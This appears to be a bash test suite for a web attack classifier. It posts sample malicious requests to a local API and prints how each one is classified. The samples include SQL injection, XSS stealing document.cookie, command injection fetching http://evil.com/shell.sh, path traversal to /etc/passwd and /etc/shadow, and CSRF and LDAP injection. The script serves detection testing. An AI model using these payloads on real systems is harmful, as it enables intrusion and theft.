#!/bin/bash
# ======================================================================
# IWASMS — Full Attack Detection Test Suite
# Runs all attack types and prints classification results
# Usage: ./tests/test_all_attacks.sh
# ======================================================================

BASE_URL="http://localhost:8000/api/v1"

TOKEN=$(curl -s -X POST "$BASE_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['access'])")

if [ -z "$TOKEN" ] || [ "$TOKEN" = "None" ]; then
  echo "ERROR: Failed to authenticate. Is the backend running?"
  exit 1
fi

classify() {
  local label=$1; shift
  result=$(curl -s -X POST "$BASE_URL/classify/" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "$1")
  type=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin)['data']['classification']; print(f\"{d['attack_type']} ({d['confidence_score']:.1%}) [{d['severity']}]\")" 2>/dev/null)
  printf "  %-24s → %s\n" "$label" "$type"
}

echo "======================================"
echo "  IWASMS Attack Detection Test Suite"
echo "======================================"
echo ""

echo "[SQL Injection]"
classify "UNION SELECT" '{"method":"GET","url":"/api/users?id=1 UNION SELECT password FROM users--","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.0.1"}'
classify "OR 1=1" '{"method":"GET","url":"/api/login?user=admin'\'' OR 1=1--","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.0.2"}'
classify "DROP TABLE" '{"method":"POST","url":"/api/query","headers":{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"},"body":"q='\'' ; DROP TABLE users;--","source_ip":"10.0.0.3"}'

echo ""
echo "[Cross-Site Scripting (XSS)]"
classify "Script tag" '{"method":"GET","url":"/search?q=<script>alert(document.cookie)</script>","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.1.1"}'
classify "Event handler" '{"method":"GET","url":"/page?x=<img src=x onerror=alert(1)>","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.1.2"}'
classify "SVG onload" '{"method":"GET","url":"/profile?bio=<svg onload=alert(1)>","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.1.3"}'

echo ""
echo "[Command Injection]"
classify "cat /etc/passwd" '{"method":"GET","url":"/api/ping?host=; cat /etc/passwd","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.1"}'
classify "wget malware" '{"method":"GET","url":"/run?c=&& wget http://evil.com/shell.sh","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.2"}'
classify "Pipe ls" '{"method":"GET","url":"/api/check?input=| ls -la /","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.3"}'

echo ""
echo "[Path Traversal]"
classify "Linux passwd" '{"method":"GET","url":"/files?p=../../../../etc/passwd","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.3.1"}'
classify "Windows SAM" '{"method":"GET","url":"/download?file=../../../windows/system32/config/sam","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.3.2"}'
classify "URL-encoded" '{"method":"GET","url":"/api/read?f=%2e%2e%2f%2e%2e%2fetc%2fshadow","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.3.3"}'

echo ""
echo "[CSRF]"
classify "Forged transfer" '{"method":"POST","url":"/api/transfer","headers":{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"},"body":"amount=10000&to_account=attacker&csrf_token=invalid","source_ip":"10.0.4.1"}'
classify "Forged delete" '{"method":"POST","url":"/api/admin/users","headers":{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"},"body":"action=delete&user_id=1&token=forged","source_ip":"10.0.4.2"}'

echo ""
echo "[LDAP Injection]"
classify "Wildcard extract" '{"method":"GET","url":"/api/directory?user=*)(|(password=*)","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.5.1"}'
classify "Admin bypass" '{"method":"GET","url":"/api/ldap?cn=admin)(&(objectClass=*)","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.5.2"}'

echo ""
echo "[Normal Traffic — Should NOT trigger alerts]"
classify "Product browse" '{"method":"GET","url":"/api/products?page=1&limit=20&category=electronics","headers":{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118"},"body":"","source_ip":"192.168.1.50"}'
classify "Search query" '{"method":"GET","url":"/api/search?q=laptop+computer&sort=price","headers":{"User-Agent":"Mozilla/5.0 Firefox/119"},"body":"","source_ip":"192.168.1.60"}'
classify "JSON login" '{"method":"POST","url":"/auth/login","headers":{"User-Agent":"Mozilla/5.0 Safari/605","Content-Type":"application/json"},"body":"{\"username\":\"john\",\"password\":\"secure123\"}","source_ip":"192.168.2.10"}'

echo ""
echo "======================================"
echo "  Test complete — check dashboard"
echo "======================================"
